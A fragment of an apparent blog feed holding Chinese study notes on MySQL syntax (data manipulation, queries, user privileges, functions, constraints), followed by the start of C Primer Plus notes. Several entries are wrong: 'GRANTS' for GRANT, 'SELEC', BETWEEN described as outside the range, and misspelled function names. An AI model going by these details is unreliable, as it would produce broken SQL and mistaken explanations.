表名;</span><br></pre></td></tr></table></figure><p><strong>删除指定表，并重新创建该表</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">TRUNCATE</span> <span class="keyword">TABLE</span> 表名;</span><br></pre></td></tr></table></figure><p>注：重新创建后的表其内置的数据已被删除</p><hr><h2 id="DML"><a href="#DML" class="headerlink" title="DML"></a>DML</h2><h3 id="添加数据"><a href="#添加数据" class="headerlink" title="添加数据"></a>添加数据</h3><p><strong>给指定字段添加数据</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> 表名 （字段<span class="number">1</span>,字段<span class="number">2</span>，...） <span class="keyword">VALUES</span>(值<span class="number">1</span>，值<span class="number">2</span>,...);</span><br></pre></td></tr></table></figure><p><strong>给全部字段添加数据</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> 表名 <span class="keyword">VALUE</span> (值<span class="number">1</span>，值<span class="number">2</span>,....);</span><br></pre></td></tr></table></figure><p><strong>批量添加数据</strong>(添加多行数据)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> 表名 （字段<span class="number">1</span>,字段<span class="number">2</span>，...） <span class="keyword">VALUES</span>（值<span class="number">1</span>，值<span class="number">2</span>,....）,（值<span class="number">1</span>，值<span class="number">2</span>,....）,（值<span class="number">1</span>，值<span class="number">2</span>,....）;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> 表名 <span class="keyword">VALUES</span> （值<span class="number">1</span>，值<span class="number">2</span>,....）,（值<span class="number">1</span>，值<span class="number">2</span>,....）,（值<span class="number">1</span>，值<span class="number">2</span>,....）;</span><br></pre></td></tr></table></figure><p>注意：</p><ul><li>插入数据时，指定的字段顺序需要与值的顺序是一一对应的。</li><li>字符串和日期型数据应该包含在引号中。</li><li>插入的数据大小，应该在字段的规定范围内</li><li>char类型的需要用<code>&#39; &#39;</code>单引号进行括号起来</li></ul><h3 id="修改数据"><a href="#修改数据" class="headerlink" title="修改数据"></a>修改数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> 表名 <span class="keyword">SET</span> 字段<span class="number">1</span><span class="operator">=</span>值<span class="number">1</span>,字段<span class="number">2</span><span class="operator">=</span>值<span class="number">2.</span>..[<span class="keyword">WHERE</span> 条件];</span><br></pre></td></tr></table></figure><p><strong>注：不加where条件会使所以的字段更改为对应的值</strong></p><h3 id="删除数据"><a href="#删除数据" class="headerlink" title="删除数据"></a>删除数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> 表名 [<span class="keyword">WHERE</span> 条件];</span><br></pre></td></tr></table></figure><p>注：</p><ul><li>如果不加入条件将删除整张表的数据</li><li>DELETE语句不能删除某个字段的值（可以用UPDATE）</li></ul><hr><h2 id="DQL"><a href="#DQL" class="headerlink" title="DQL"></a>DQL</h2><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> </span><br><span class="line">字段列表</span><br><span class="line"><span class="keyword">FROM</span></span><br><span class="line">表名列表</span><br><span class="line"><span class="keyword">WHERE</span></span><br><span class="line">条件列表</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span></span><br><span class="line">分组字段列表</span><br><span class="line"><span class="keyword">HAVING</span></span><br><span class="line">分组后条件列表</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span></span><br><span class="line">排序字段列表</span><br><span class="line">LIMIT</span><br><span class="line">分页参数</span><br></pre></td></tr></table></figure><h3 id="基本查询"><a href="#基本查询" class="headerlink" title="基本查询"></a>基本查询</h3><p>1.查询多个字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 字段<span class="number">1</span>，字段<span class="number">2</span>，字段<span class="number">3</span>，...<span class="keyword">FROM</span> 表名;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELEC <span class="operator">*</span> <span class="keyword">FROM</span> 表名;# <span class="operator">*</span>代表查询所有</span><br></pre></td></tr></table></figure><p>2.设置别名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 字段<span class="number">1</span> [<span class="keyword">AS</span> 别名<span class="number">1</span>],字段<span class="number">2</span> [<span class="keyword">AS</span> 别名<span class="number">2</span>] ...<span class="keyword">FROM</span> 表名;</span><br></pre></td></tr></table></figure><p>注：<code>AS</code>可省略，直接添加上别名</p><p>3.去除重复数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> 字段列表 <span class="keyword">FROM</span> 表名;</span><br></pre></td></tr></table></figure><h3 id="条件查询-WHERE"><a href="#条件查询-WHERE" class="headerlink" title="条件查询(WHERE)"></a>条件查询(WHERE)</h3><p>语法</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 字段列表 <span class="keyword">FROM</span> 表名 <span class="keyword">WHERE</span> 条件列表;</span><br></pre></td></tr></table></figure><p>条件</p><table><thead><tr><th>比较运算符</th><th>功能</th><th>比较运算符</th><th>功能</th></tr></thead><tbody><tr><td>&gt;</td><td>大于</td><td>&#x3D;</td><td>等于</td></tr><tr><td>&gt;&#x3D;</td><td>大于等于</td><td>&lt;&gt;或!&#x3D;</td><td>不等于</td></tr><tr><td>&lt;</td><td>小于</td><td>BETWEEN … AND…</td><td>在某个范围之外（含最大、最小值）</td></tr><tr><td>&lt;&#x3D;</td><td>小于等于</td><td>IN(…)</td><td>在in之后的列表中的值，多选一</td></tr><tr><td>LIKE 占位符</td><td>模糊匹配（ _匹配当个字符，%匹配任意个字符）</td><td>IS NULL</td><td>是NULL</td></tr></tbody></table><table><thead><tr><th>逻辑运算符</th><th>功能</th></tr></thead><tbody><tr><td>AND或&amp;&amp;</td><td>并且（多个条件同时成立）</td></tr><tr><td>OR或 ||</td><td>或者（多个条件任意一个成立）</td></tr><tr><td>NOT 或 ！</td><td>非</td></tr></tbody></table><h3 id="聚合函数-count-max-min-avg-sum"><a href="#聚合函数-count-max-min-avg-sum" class="headerlink" title="聚合函数(count,max,min,avg,sum)"></a>聚合函数(count,max,min,avg,sum)</h3><p><strong>作用</strong>：将一列函数作为一个整体，进行纵向计算</p><p><strong>常见聚合函数</strong></p><table><thead><tr><th align="center">函数</th><th align="center">功能</th></tr></thead><tbody><tr><td align="center">count</td><td align="center">统计量</td></tr><tr><td align="center">max</td><td align="center">最大值</td></tr><tr><td align="center">min</td><td align="center">最小值</td></tr><tr><td align="center">avg</td><td align="center">平均值</td></tr><tr><td align="center">sum</td><td align="center">求和</td></tr></tbody></table><p><strong>语法</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 聚合函数(字段列表) <span class="keyword">FROM</span> 表名;</span><br></pre></td></tr></table></figure><p><strong>注：</strong></p><ul><li>null值不参与所有聚合函数运算</li><li>count会统计字段列表中，含有最多数目的字段</li></ul><h3 id="分组查询-GROUP-BY"><a href="#分组查询-GROUP-BY" class="headerlink" title="分组查询(GROUP BY)"></a>分组查询(GROUP BY)</h3><p><strong>语法</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 字段列表 <span class="keyword">FROM</span> 表名 [<span class="keyword">WHERE</span> 条件] <span class="keyword">GROUP</span> <span class="keyword">BY</span> 分组字段名 [<span class="keyword">HAVING</span> 分组后过滤的条件]</span><br></pre></td></tr></table></figure><p><strong>注：</strong></p><ul><li><code>where</code>先筛选符合的字段，<code>having</code>筛选分组后的字段。因此<code>where</code>不能对聚合函数进行判断，而<code>having</code>可以。</li><li>执行顺序：<code>where </code>&gt; 聚合函数 &gt; <code>having</code></li><li>分组之后，查询的字段一般为聚合函数和分组字段，查询其他的字段无意义</li><li>依照分组字段进行分组时，非分组字段只显示一次出现的值</li><li>此处使用聚合函数，获得的是分组后使用聚合函数的结果</li></ul><h3 id="排序查询-ORDER-BY"><a href="#排序查询-ORDER-BY" class="headerlink" title="排序查询(ORDER BY)"></a>排序查询(ORDER BY)</h3><p><strong>语法</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 字段列表 <span class="keyword">FROM</span> 表名 <span class="keyword">ORDER</span> <span class="keyword">BY</span> 字段<span class="number">1</span> 排序方式<span class="number">1</span>,字段<span class="number">2</span> 排序方式<span class="number">2</span>; </span><br></pre></td></tr></table></figure><p><strong>排序方式</strong></p><ul><li><strong>ASC</strong>:升序（默认值）</li><li>DESC:降序</li></ul><p><strong>注</strong>：如果是多字段排序，当第一个字段相同时，才根据第二个字段进行排序</p><h3 id="分页查询-LIMIT"><a href="#分页查询-LIMIT" class="headerlink" title="分页查询(LIMIT)"></a>分页查询(LIMIT)</h3><p><strong>语法</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> 字段列表 <span class="keyword">FROM</span> 表名 LIMIT 起始索引,查询记录数;</span><br></pre></td></tr></table></figure><p><strong>注：</strong></p><ul><li>起始索引从0开始，起始索引＝（查询页码-1）*每页显示记录数。</li><li>分页查询是数据库的方，不同的数据库有不同的实现，MySQL中是LIMIT。</li><li>如果查询的是第一页数据，起始索引可以省略，直接简写为limit +数目。</li></ul><h3 id="DQL顺序"><a href="#DQL顺序" class="headerlink" title="DQL顺序"></a>DQL顺序</h3><p><strong>编辑顺序</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">字段列表</span><br><span class="line"><span class="keyword">FROM</span></span><br><span class="line">表名列表</span><br><span class="line"><span class="keyword">WHERE</span></span><br><span class="line">条件列表</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span></span><br><span class="line">分组字段列表</span><br><span class="line"><span class="keyword">HAVING</span></span><br><span class="line">分组后条件列表</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span></span><br><span class="line">排序字段列表</span><br><span class="line">LIMIT</span><br><span class="line">分页参数</span><br></pre></td></tr></table></figure><p><strong>执行顺序</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span></span><br><span class="line">表名列表</span><br><span class="line"><span class="keyword">WHERE</span></span><br><span class="line">条件列表</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span></span><br><span class="line">分组字段列表</span><br><span class="line"><span class="keyword">HAVING</span></span><br><span class="line">分组后条件列表</span><br><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">字段列表</span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span></span><br><span class="line">排序字段列表</span><br><span class="line">LIMIT</span><br><span class="line">分页参数</span><br></pre></td></tr></table></figure><hr><h2 id="DCL"><a href="#DCL" class="headerlink" title="DCL"></a>DCL</h2><h3 id="管理用户"><a href="#管理用户" class="headerlink" title="管理用户"></a>管理用户</h3><p><strong>1.查询用户</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">USE mysql;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> <span class="keyword">user</span>;</span><br></pre></td></tr></table></figure><p><strong>2.创建用户</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> <span class="string">&#x27;用户名&#x27;</span>@<span class="string">&#x27;主机名&#x27;</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">&#x27;密码&#x27;</span>;</span><br></pre></td></tr></table></figure><p><strong>3.修改用户密码</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">USER</span> <span class="string">&#x27;用户名&#x27;</span>@<span class="string">&#x27;主机名&#x27;</span> IDENTIFIED <span class="keyword">WITH</span> mysql_native_password <span class="keyword">BY</span> <span class="string">&#x27;新密码&#x27;</span>;</span><br></pre></td></tr></table></figure><p><strong>4.删除用户</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">USER</span> <span class="string">&#x27;用户名&#x27;</span>@<span class="string">&#x27;主机名&#x27;</span>;</span><br></pre></td></tr></table></figure><p>注：主机名可以使用<code>%</code>通配</p><h3 id="权限控制"><a href="#权限控制" class="headerlink" title="权限控制"></a>权限控制</h3><p><strong>常用权限</strong></p><table><thead><tr><th align="center">权限</th><th align="center">说明</th><th align="center">权限</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">ALL,ALL PRIVILEGES</td><td align="center">所有权限</td><td align="center">DELETE</td><td align="center">删除数据</td></tr><tr><td align="center">SELECT</td><td align="center">查询数据</td><td align="center">ALTER</td><td align="center">修改表</td></tr><tr><td align="center">INSERT</td><td align="center">插入数据</td><td align="center">DROP</td><td align="center">删除数据库&#x2F;表&#x2F;视图</td></tr><tr><td align="center">UPDATE</td><td align="center">修改数据</td><td align="center">CREATE</td><td align="center">创建数据库&#x2F;表</td></tr></tbody></table><p>1.查询权限</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> GRANTS <span class="keyword">FOR</span> <span class="string">&#x27;用户名&#x27;</span>@<span class="string">&#x27;主机名&#x27;</span>;</span><br></pre></td></tr></table></figure><p>2.授予权限</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GRANTS 权限列表 <span class="keyword">ON</span> 数据库.表名 <span class="keyword">TO</span> <span class="string">&#x27;用户名&#x27;</span>@<span class="string">&#x27;主机名&#x27;</span>;</span><br></pre></td></tr></table></figure><p>3.撤销权限</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">REVOKE</span> 权限列表 <span class="keyword">ON</span> 数据库.表名 <span class="keyword">FROM</span> <span class="string">&#x27;用户名&#x27;</span>@<span class="string">&#x27;主机名&#x27;</span>;</span><br></pre></td></tr></table></figure><p>注：</p><p>多个权限之间用<code>,</code>进行分割</p><p>授权时，数据库名和表名可以使用<code>*</code>进行通配，代表所有。</p><h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a><strong>函数</strong></h1><h2 id="字符串函数"><a href="#字符串函数" class="headerlink" title="字符串函数"></a>字符串函数</h2><table><thead><tr><th>函数</th><th>功能</th></tr></thead><tbody><tr><td>CONCAT(51,52….sn)</td><td>字符串拼接，将S1，S2，.. Sn拼接成一个字符电</td></tr><tr><td>LOWER(st)</td><td>将字符串st全部转为小写</td></tr><tr><td>UPPER(st)</td><td>将字符串st全部转为大写</td></tr><tr><td>LPAD(str,n,pad)</td><td>左境充，用字符串pad对st的左边进行境充，达到n个字符审长度</td></tr><tr><td>RPAD(str,n,pad)</td><td>右填充，用字符串pad对str的右边进行填充，达到n个字符串长度</td></tr><tr><td>TRIM(str)</td><td>去掉字符串头部和尾部的空格</td></tr><tr><td>SUBSTRING(str,;start,len)</td><td>返回从字符串sL从start位置起的len个长度的字符串</td></tr></tbody></table><h2 id="数值函数"><a href="#数值函数" class="headerlink" title="数值函数"></a>数值函数</h2><table><thead><tr><th>函数</th><th>功能</th></tr></thead><tbody><tr><td>CILX</td><td>向上取整(存在小数就加一)</td></tr><tr><td>FLODR(x)</td><td>向下取整</td></tr><tr><td>MOD(x，y)</td><td>返回x&#x2F;y的模</td></tr><tr><td>RAND()</td><td>返回0-1内的随机数</td></tr><tr><td>ROUND(x,y)</td><td>求参数x的四舍五入的值，保留y位小数</td></tr></tbody></table><h2 id="日期函数"><a href="#日期函数" class="headerlink" title="日期函数"></a>日期函数</h2><table><thead><tr><th>函数</th><th>功能</th></tr></thead><tbody><tr><td>CURDATE()</td><td>返回当前日期</td></tr><tr><td>CURTIME</td><td>返回当前时间</td></tr><tr><td>NOW()</td><td>返回当前日期和时间</td></tr><tr><td>YEAR(dale)</td><td>获取指定date的年份</td></tr><tr><td>MONTH(date)</td><td>获取指定date的月份</td></tr><tr><td>DAY(date)</td><td>获取指定date的日期</td></tr><tr><td>DATE_ADD(date,INTERVAL expr type)</td><td>返回一个日期&#x2F;时间值加上一个时间间隔expr后的时间值</td></tr><tr><td>DATEDIFF(date1,date2)</td><td>返回起始时间date1和结束时间date2之间的天数</td></tr></tbody></table><h2 id="流程函数"><a href="#流程函数" class="headerlink" title="流程函数"></a>流程函数</h2><table><thead><tr><th>函数</th><th>功能</th></tr></thead><tbody><tr><td>IF(value , t , f)</td><td>如果value为true，则返回t，否则返回f</td></tr><tr><td>IFNULL(value1, value2)</td><td>如果value1不为空，返回value1，否则返回value2</td></tr><tr><td>CASE WHEN [val1] 1 THEN res11 .. ELSE[default] END</td><td>如果val1为true，返回res1，…否则返回default默认值</td></tr><tr><td>CASE[expr1] WHEN [val1] THEN [res1] … ELSE[default] END</td><td>如果expr的值等于val1，返回res1，…否则返回default默认值</td></tr></tbody></table><p>注：CASE后可跟多个WHEN;</p><h1 id="约束"><a href="#约束" class="headerlink" title="约束"></a><strong>约束</strong></h1><p>概述：作用于表中字段上的规则，用于限制储存在表中的数据</p><p>目的:保证数据库中数据的正确、有效性和完整性</p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><table><thead><tr><th>约束</th><th>描述</th><th></th></tr></thead><tbody><tr><td>非空约束</td><td>限制该字段的数据不能为null</td><td>NOT NULL</td></tr><tr><td>唯一约束</td><td>保证该字段的所有数据都是唯一、不重复的</td><td>UNIOUE</td></tr><tr><td>主键约束</td><td>主键是一行数据的唯一标识，要求非空且唯一</td><td>PRIMARY KEY</td></tr><tr><td>默认约束</td><td>保存数据时，如果未指定该字段的值，则采用默认值</td><td>DEFAULT</td></tr><tr><td>检查约束(8.0.16版本之后)</td><td>保证字段值满足某一个条件</td><td>CHECK</td></tr><tr><td>外键约束</td><td>用来让两张表的数据之间建立连接，保证数据的一致性和完整性关键字</td><td>FOREIGN KLY</td></tr></tbody></table><p>注: </p><ul><li>约束是作用于表中字段上的，可以在创建表&#x2F;修改表的时候添加约束</li><li>一个字段可以使用多个约束条件</li></ul><h2 id="外键约束"><a href="#外键约束" class="headerlink" title="外键约束"></a>外键约束</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;本篇笔记中默认的规则：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;代码中出现&lt;code&gt;[]&lt;/code&gt;的部分为可写可不写的&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="开发" scheme="https://we11s.github.io/categories/%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="CTF-Web" scheme="https://we11s.github.io/tags/CTF-Web/"/>
    
    <category term="开发" scheme="https://we11s.github.io/tags/%E5%BC%80%E5%8F%91/"/>
    
    <category term="Web-SQL" scheme="https://we11s.github.io/tags/Web-SQL/"/>
    
  </entry>
  
  <entry>
    <title>C Primer Plus笔记</title>
    <link href="https://we11s.github.io/posts/3276277813/"/>
    <id>https://we11s.github.io/posts/3276277813/</id>
    <published>2023-09-24T12:28:28.000Z</published>
    <updated>2024-03-05T14:20:00.609Z</updated>
    
    <content type="html"><![CDATA[<h1 id="C语言概述"><a href="#C语言概述" class="headerlink" title="C语言概述"></a><strong>C语言概述</strong></h1><h2 id="C程序的基本结构"><a href="#C程序的基本结构" class="headerlink" title="C程序的基本结构"></a>C程序的基本结构</h2><p>​       程序由一个或多个函数组成，<strong>必须有 main()函数。</strong></p><p>​        函数由函数头和函数体组成。函数头包括函数名、传入该函数的信息类型和函数的返回类型。通过函数名后的圆括号可识别出函数，圆括号里可能为空，可能有参数。函数体被花括号括起来，由一系列语句、声明组成。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>  <span class="comment">//函数头</span></span><br><span class="line"><span class="comment">/* 以下为函数体 */</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> q;  <span class="comment">//声明</span></span><br><span class="line">    q = <span class="number">1</span>;  <span class="comment">//语句</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d is neat.\n&quot;</span>,q);  <span class="comment">//语句</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="多个函数"><a href="#多个函数" class="headerlink" title="多个函数"></a>多个函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//* two_func.c -- 一个文件中包含两个函数 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">butler</span><span class="params">(<span class="type">void</span>)</span>; <span class="comment">/* ANSI/ISO C函数原型 */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;I will summon the butler function.\n&quot;</span>);</span><br><span class="line">butler();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Yes. Bring me some tea and writeable</span></span><br><span class="line"><span class="string">DVDs.\n&quot;</span>); <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">butler</span><span class="params">(<span class="type">void</span>)</span> <span class="comment">/* 函数定义开始 */</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;You rang, sir?\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该程序的输出如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">I will summon the butler function.</span><br><span class="line">You rang, sir?</span><br><span class="line">Yes.Bring me some tea and writeable DVDs.</span><br></pre></td></tr></table></figure><p><strong>分析：</strong></p><p>​       <code>butler()</code> 函数在程序中出现了3 次。第1 次是函数原型（prototype），告知编译器在程序中要使用该函数；第 2 次以函数调用（function call）的形式出现在 <code>main()</code>中；最后一次出现在函数定义（function definition）中，</p><p><strong><code>butler（）</code>单独不运行的原因：</strong></p><p>​        在典型的C程序中，<strong>只有<code>main</code>函数会在程序启动时自动执行</strong>。其他函数不会在程序启动时自动执行，除非它们被显式地从<code>main</code>函数或其他函数中调用。在您提供的代码示例中，只有<code>main</code>函数会在程序启动时执行，因为它是程序的入口点。其他函数，如<code>butler</code>函数，只有在被调用时才会执行。</p><h2 id="关键字与保留标识符"><a href="#关键字与保留标识符" class="headerlink" title="关键字与保留标识符"></a>关键字与保留标识符</h2><p>​        <strong>关键字</strong>是C语言的词汇。不能用它们作为标识符（如，变量名）。</p><p>​        <strong>保留标识符</strong>（reserved identifier），C语言已经指定了它们的用途或保留它们的使用权，如果你使用这些标识符来表示其他意思会导致一些问题。保留标识符包括那些以下划线字符开头的标识符和标准库函数名，如printf()。</p><h2 id="本章注意点："><a href="#本章注意点：" class="headerlink" title="本章注意点："></a><strong>本章注意点：</strong></h2><hr><h3 id="标识符名"><a href="#标识符名" class="headerlink" title="标识符名"></a>标识符名</h3><p>可以用小写字母、大写字母、数字和下划线（_）来命名。而且，名称的第1个字符必须是字符或下划线，<strong>不能是数字</strong>。</p><p>操作系统和C库经常使用以一个或两个下划线字符开始的标识符（如，_kcab），因此最好避免在自己的程序中使用这种名称。</p><h3 id="转义序列"><a href="#转义序列" class="headerlink" title="转义序列"></a>转义序列</h3><p>换行符是一个转义序列（escape sequence）。转义序列用于代表难以表示或无法输入的字符。如，\t代表Tab键，\b代表Backspace键（退格键）。<strong>每个转义序列都以反斜杠字符（\）开始。</strong></p><p>​        反转义符的使用通常发生在<strong>字符串文字（用双引号或单引号括起来的文本）</strong>中，以便在其中插入特殊字符或控制字符。所以，一般来说，反转义符需要在字符串文字中使用，不管是在双引号(“”)中还是单引号(‘’)中。</p><h3 id="参数中的-d在打印时有什么作用？"><a href="#参数中的-d在打印时有什么作用？" class="headerlink" title="参数中的%d在打印时有什么作用？"></a>参数中的%d在打印时有什么作用？</h3><p><code>%d</code>相当于是一个占位符，其作用是指明输出值的位置。</p><p><code>%</code>提醒程序，要在该处打印一个变量，d表明把变量作为十进制整数打印。</p><p><code>printf()</code>函数名中的这个 <code>f</code>表示 “format”（格式），提醒用户这是一种格式化打印函数。</p><hr><h1 id="数据与C"><a href="#数据与C" class="headerlink" title="数据与C"></a><strong>数据与C</strong></h1><h2 id="数据类型关键字"><a href="#数据类型关键字" class="headerlink" title="数据类型关键字"></a>数据类型关键字</h2><table><thead><tr><th>K&amp;R给出的关键字</th><th>C90标准添加的关键字</th><th>C99标准添加的关键字</th></tr></thead><tbody><tr><td>int</td><td>signed</td><td>_Bool</td></tr><tr><td>long</td><td>void</td><td>_Complex</td></tr><tr><td>short</td><td></td><td>_Imaginary</td></tr><tr><td>unsigned</td><td></td><td></td></tr><tr><td>char</td><td></td><td></td></tr><tr><td>float</td><td></td><td></td></tr><tr><td>double</td><td></td><td></td></tr></tbody></table><p><strong>注：</strong>在C语言中</p><p>​        用<code>int</code>关键字来表示基本的整数类型。后3个关键字（<code>long</code>、<code>short</code>和<code>unsigned</code>）和C90新增的<code>signed</code>用于提供基本整数类型的变式，例如<code>unsigned short int</code>和<code>long long int</code>。</p><p>​        <code>char</code>关键字用于指定字母和其他字符（如，#、$、%和*）。另外，char类型也可以表示较小的整数。</p><p>​        <code>float</code>、<code>double</code>和<code>long double</code>表示带小数点的数。</p><p>​        <code>_Bool</code> 类型表示布尔值（ <code>true</code> 或<code>false</code> ） ， <code>_complex</code> 和<code>_Imaginary</code>分别表示复数和虚数。</p><p>​        <code>unsigned int</code>或<code>unsigned</code>只用于非负值的场合。这种类型与有符号类型表示的范围不同。用于表示正负号的位现在用于表示另一个二进制位，所以无符号整型可以表示更大的数。例如，16位<code>unsigned int</code>允许的取值范围是<code>0～65535</code>，而不是-32768～32767。</p><h2 id="不同数据类型的储存"><a href="#不同数据类型的储存" class="headerlink" title="不同数据类型的储存"></a>不同数据类型的储存</h2><h3 id="整数的储存"><a href="#整数的储存" class="headerlink" 